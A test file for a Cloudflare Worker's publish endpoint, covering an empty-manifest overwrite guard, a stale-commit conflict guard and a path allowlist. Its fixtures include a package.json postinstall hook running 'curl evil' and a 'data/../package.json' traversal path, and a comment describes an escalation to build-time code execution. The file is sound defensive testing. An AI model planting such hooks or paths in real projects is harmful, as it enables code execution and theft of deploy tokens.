// Publish safety guard (worker.js): a publish must never blank a live data
// manifest. Every data/*.json is a JSON array the Field Console rebuilds from
// its in-memory state on each publish — a stale/evicted session can serialize an
// empty array and silently wipe live content. That is what emptied data/posts.json
// (12 → 0) and blanked the FN//Blog listing on 2026-07-10. The guard refuses any
// commit that would replace a non-empty manifest on main with an empty one.
import { describe, it, expect, vi, afterEach } from 'vitest';
import worker, { _isEmptyJsonArray, _emptyOverwriteGuard } from '../worker.js';
import { createToken } from '../src/shared/auth.js';

describe('_isEmptyJsonArray', () => {
  it('detects an empty array (any whitespace form)', () => {
    expect(_isEmptyJsonArray('[]')).toBe(true);
    expect(_isEmptyJsonArray('[\n]')).toBe(true);
    expect(_isEmptyJsonArray('  []  ')).toBe(true);
  });

  it('is false for a non-empty array', () => {
    expect(_isEmptyJsonArray('[{"id":"a"}]')).toBe(false);
  });

  it('is false for non-arrays and unparseable content', () => {
    expect(_isEmptyJsonArray('{}')).toBe(false);
    expect(_isEmptyJsonArray('null')).toBe(false);
    expect(_isEmptyJsonArray('not json')).toBe(false);
    expect(_isEmptyJsonArray('')).toBe(false);
  });
});

describe('_emptyOverwriteGuard', () => {
  it('blocks wiping a non-empty manifest to []', () => {
    const files = [{ path: 'data/posts.json', content: '[]' }];
    const current = { 'data/posts.json': JSON.stringify([{ id: 'a' }, { id: 'b' }]) };
    expect(_emptyOverwriteGuard(files, current)).toEqual({ path: 'data/posts.json', was: 2 });
  });

  it('reports the FIRST wiped manifest when several are empty', () => {
    const files = [
      { path: 'data/posts.json', content: '[]' },
      { path: 'data/wallpapers.json', content: '[]' },
    ];
    const current = {
      'data/posts.json': '[{"id":"a"}]',
      'data/wallpapers.json': '[{"id":"w"}]',
    };
    expect(_emptyOverwriteGuard(files, current).path).toBe('data/posts.json');
  });

  it('allows an empty publish when main is ALSO empty (fresh fork, nothing to lose)', () => {
    const files = [{ path: 'data/posts.json', content: '[]' }];
    const current = { 'data/posts.json': '[]' };
    expect(_emptyOverwriteGuard(files, current)).toBeNull();
  });

  it('allows an empty publish when the manifest does not yet exist on main', () => {
    const files = [{ path: 'data/posts.json', content: '[]' }];
    expect(_emptyOverwriteGuard(files, { 'data/posts.json': null })).toBeNull();
    expect(_emptyOverwriteGuard(files, {})).toBeNull();
  });

  it('never blocks a normal non-empty publish', () => {
    const files = [{ path: 'data/posts.json', content: '[{"id":"a"}]' }];
    const current = { 'data/posts.json': '[{"id":"a"},{"id":"b"}]' };
    expect(_emptyOverwriteGuard(files, current)).toBeNull();
  });

  it('only guards top-level data/*.json manifests, not other empty-array files', () => {
    const files = [
      { path: 'posts/fn-000.md', content: '[]' },
      { path: 'data/nested/thing.json', content: '[]' },
      { path: 'something.json', content: '[]' },
    ];
    const current = {
      'posts/fn-000.md': '[{"x":1}]',
      'data/nested/thing.json': '[{"x":1}]',
      'something.json': '[{"x":1}]',
    };
    expect(_emptyOverwriteGuard(files, current)).toBeNull();
  });
});

// ---- Base-revision (stale-publish) guard, end-to-end through /api/publish ----
// The worker rejects a publish whose baseSha no longer matches main's HEAD —
// another device committed in between, so this bundle is stale. This is what a
// backgrounded iPad PWA republishing over a laptop's fresh commit trips.
describe('POST /api/publish — stale-base guard', () => {
  const SECRET = 'test-secret-please-ignore';
  const ctx = { waitUntil() {} };
  const env = { SESSION_SECRET: SECRET, GITHUB_TOKEN: 'gh-token', GITHUB_REPO: 'owner/repo' };

  afterEach(() => { vi.restoreAllMocks(); });

  async function publishReq(body) {
    const token = await createToken(env);
    return new Request('https://example.com/api/publish', {
      method: 'POST',
      headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
  }

  // Stub only the GitHub endpoints the publish path touches. HEAD is `currentSha`.
  function stubGitHub(currentSha) {
    vi.spyOn(globalThis, 'fetch').mockImplementation(async (url) => {
      const u = String(url);
      if (u.includes('git/ref/heads/main')) {
        return new Response(JSON.stringify({ object: { sha: currentSha } }), { status: 200 });
      }
      if (u.includes('git/commits/')) {
        return new Response(JSON.stringify({ tree: { sha: 'tree-sha' } }), { status: 200 });
      }
      if (u.endsWith('/git/blobs')) {
        return new Response(JSON.stringify({ sha: 'blob-sha' }), { status: 200 });
      }
      if (u.endsWith('/git/trees')) {
        return new Response(JSON.stringify({ sha: 'new-tree-sha' }), { status: 200 });
      }
      if (u.endsWith('/git/commits')) {
        return new Response(JSON.stringify({ sha: 'new-commit-sha' }), { status: 200 });
      }
      if (u.includes('git/refs/heads/main')) {
        return new Response(JSON.stringify({ object: { sha: 'new-commit-sha' } }), { status: 200 });
      }
      throw new Error(`unexpected fetch: ${u}`);
    });
  }

  const nonEmptyFile = { path: 'data/posts.json', content: '[{"id":"a"}]' };

  it('rejects with 409 stale_base when baseSha is behind main HEAD', async () => {
    stubGitHub('CURRENT_HEAD');
    const res = await worker.fetch(await publishReq({ files: [nonEmptyFile], baseSha: 'OLD_HEAD' }), env, ctx);
    expect(res.status).toBe(409);
    const body = await res.json();
    expect(body.code).toBe('stale_base');
    expect(body.currentSha).toBe('CURRENT_HEAD');
  });

  it('commits when baseSha matches main HEAD', async () => {
    stubGitHub('CURRENT_HEAD');
    const res = await worker.fetch(await publishReq({ files: [nonEmptyFile], baseSha: 'CURRENT_HEAD' }), env, ctx);
    expect(res.status).toBe(200);
    const body = await res.json();
    expect(body.ok).toBe(true);
    expect(body.sha).toBe('new-commit-sha');
  });

  it('commits when no baseSha is sent (backward-compatible older client)', async () => {
    stubGitHub('CURRENT_HEAD');
    const res = await worker.fetch(await publishReq({ files: [nonEmptyFile] }), env, ctx);
    expect(res.status).toBe(200);
    expect((await res.json()).ok).toBe(true);
  });

  // The window the check above CANNOT cover. _commitFiles reads HEAD, then
  // uploads blobs, a tree and a commit — several round-trips — and only then
  // moves the ref. A device that publishes during those round-trips leaves
  // main ahead of the parent we built on, so the ref PATCH is no longer a
  // fast-forward and GitHub answers 422.
  //
  // That is the same conflict the guard exists for, and it used to surface as
  // a generic 500 carrying GitHub's own wording — so the console's stale-base
  // handling never ran for the one race it was written to handle.
  function stubGitHubRaceOnPatch(headSha, afterSha) {
    let refReads = 0;
    vi.spyOn(globalThis, 'fetch').mockImplementation(async (url, init) => {
      const u = String(url);
      if (u.includes('git/ref/heads/main')) {
        // First read is the pre-flight HEAD; the re-read after the 422 must
        // report whoever won the race.
        refReads += 1;
        return new Response(
          JSON.stringify({ object: { sha: refReads === 1 ? headSha : afterSha } }),
          { status: 200 }
        );
      }
      if (u.includes('git/commits/')) return new Response(JSON.stringify({ tree: { sha: 't' } }), { status: 200 });
      if (u.endsWith('/git/blobs')) return new Response(JSON.stringify({ sha: 'blob-sha' }), { status: 200 });
      if (u.endsWith('/git/trees')) return new Response(JSON.stringify({ sha: 'new-tree-sha' }), { status: 200 });
      if (u.endsWith('/git/commits')) return new Response(JSON.stringify({ sha: 'new-commit-sha' }), { status: 200 });
      if (u.includes('git/refs/heads/main') && init?.method === 'PATCH') {
        return new Response(
          JSON.stringify({ message: 'Update is not a fast forward' }),
          { status: 422 }
        );
      }
      throw new Error(`unexpected fetch: ${u}`);
    });
  }

  it('maps a non-fast-forward ref update (422) to the same 409 stale_base', async () => {
    stubGitHubRaceOnPatch('CURRENT_HEAD', 'RACED_HEAD');
    const res = await worker.fetch(
      await publishReq({ files: [nonEmptyFile], baseSha: 'CURRENT_HEAD' }), env, ctx);
    expect(res.status).toBe(409);
    const body = await res.json();
    expect(body.code).toBe('stale_base');
    // ...and it names the commit that beat us, so the console can say what to sync.
    expect(body.currentSha).toBe('RACED_HEAD');
  });

  it('still reports a genuine GitHub failure as a 500, not a false conflict', async () => {
    vi.spyOn(globalThis, 'fetch').mockImplementation(async (url) => {
      const u = String(url);
      if (u.includes('git/ref/heads/main')) {
        return new Response(JSON.stringify({ object: { sha: 'CURRENT_HEAD' } }), { status: 200 });
      }
      if (u.includes('git/commits/')) return new Response(JSON.stringify({ tree: { sha: 't' } }), { status: 200 });
      return new Response(JSON.stringify({ message: 'Bad credentials' }), { status: 401 });
    });
    const res = await worker.fetch(
      await publishReq({ files: [nonEmptyFile], baseSha: 'CURRENT_HEAD' }), env, ctx);
    expect(res.status).toBe(500);
    expect((await res.json()).code).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// Which paths a publish may write (2026-08-07).
//
// /api/publish accepted any path the client sent. Untidy while a commit was
// just a commit — and an escalation once an instance connects its repo to
// Cloudflare's git integration, because a push then triggers a BUILD:
//
//   console session -> publish `package.json` carrying a postinstall script
//     -> lands on main -> Workers Build runs `npm install`
//     -> arbitrary code runs holding the build's Cloudflare API token
//
// and that token has account-level Workers deploy rights (Cloudflare has no
// per-Worker scope for it), so an admin password on one site reached every
// Worker on the account. Found while wiring git integration to the demo.
describe('POST /api/publish — path allowlist', () => {
  const SECRET = 'test-secret-please-ignore';
  const ctx = { waitUntil() {} };
  const env = { SESSION_SECRET: SECRET, GITHUB_TOKEN: 'gh-token', GITHUB_REPO: 'owner/repo' };

  afterEach(() => { vi.restoreAllMocks(); });

  async function publish(files) {
    const token = await createToken(env);
    const req = new Request('https://example.com/api/publish', {
      method: 'POST',
      headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ files, baseSha: 'CURRENT_HEAD' }),
    });
    return worker.fetch(req, env, ctx);
  }

  it.each([
    ['package.json — postinstall is code execution in the build', 'package.json'],
    ['a CI workflow', '.github/workflows/deploy.yml'],
    ['the Worker itself', 'worker.js'],
    ['engine source', 'src/api/publish.js'],
    ['the deploy config', 'wrangler.jsonc'],
    ['traversal out of data/', 'data/../package.json'],
    ['a nested path under data/', 'data/nested/thing.json'],
    ['right prefix, wrong extension', 'data/evil.js'],
  ])('refuses %s', async (_label, path) => {
    // No GitHub stub on purpose: if the guard leaks, the fetch is unmocked and
    // the test fails loudly rather than quietly committing.
    const res = await publish([{ path, content: 'x' }]);
    expect(res.status).toBe(400);
    const body = await res.json();
    expect(body.code).toBe('path_not_publishable');
  });

  it('refuses the WHOLE publish when one path is bad', async () => {
    // A partial commit that silently dropped the bad path would leave the
    // author believing everything landed.
    const res = await publish([
      { path: 'data/posts.json', content: '[{"id":"a"}]' },
      { path: 'package.json', content: '{"scripts":{"postinstall":"curl evil"}}' },
    ]);
    expect(res.status).toBe(400);
    expect((await res.json()).paths).toContain('package.json');
  });

  it('still allows exactly what buildBundle emits', async () => {
    vi.spyOn(globalThis, 'fetch').mockImplementation(async (url) => {
      const u = String(url);
      if (u.includes('git/ref/heads/main')) return new Response(JSON.stringify({ object: { sha: 'CURRENT_HEAD' } }), { status: 200 });
      if (u.includes('git/commits/')) return new Response(JSON.stringify({ tree: { sha: 't' } }), { status: 200 });
      if (u.endsWith('/git/blobs')) return new Response(JSON.stringify({ sha: 'blob' }), { status: 200 });
      if (u.endsWith('/git/trees')) return new Response(JSON.stringify({ sha: 'tree' }), { status: 200 });
      if (u.endsWith('/git/commits')) return new Response(JSON.stringify({ sha: 'new-commit-sha' }), { status: 200 });
      if (u.includes('git/refs/heads/main')) return new Response(JSON.stringify({}), { status: 200 });
      throw new Error(`unexpected fetch: ${u}`);
    });
    const res = await publish([
      { path: 'data/archive.json', content: '[{"id":"a"}]' },
      { path: 'data/posts.json', content: '[{"id":"p"}]' },
      { path: 'posts/fn-001.md', content: '# note' },
    ]);
    expect(res.status).toBe(200);
    expect((await res.json()).ok).toBe(true);
  });
});
